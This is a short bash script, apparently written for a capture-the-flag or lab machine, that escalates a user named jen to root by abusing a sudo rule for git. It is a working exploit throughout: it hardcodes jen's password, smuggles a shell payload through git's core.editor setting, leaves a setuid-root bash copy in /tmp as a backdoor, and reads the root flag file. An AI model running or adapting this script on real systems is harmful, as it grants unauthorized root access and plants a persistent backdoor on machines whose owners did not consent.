#!/bin/bash
# jen -> root: sudo git (GTFOBins).
#
# jen may run `sudo /usr/bin/git`. The documented interactive path is
#     sudo git -p help config   ->   !/bin/sh
# This runs it non-interactively by abusing core.editor, which `git config -e`
# launches as root: it drops a setuid-root bash and reads /root/root.txt.
#
# Run this AS jen on the target.
PW="binzpbeocnexoe"
PAY='cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; cat /root/root.txt > /tmp/root_flag.txt; chmod 644 /tmp/root_flag.txt'

echo "$PW" | sudo -S git -c "core.editor=sh -c '$PAY' #" config -e --global 2>/dev/null

/tmp/rootbash -p -c 'id; cat /root/root.txt'
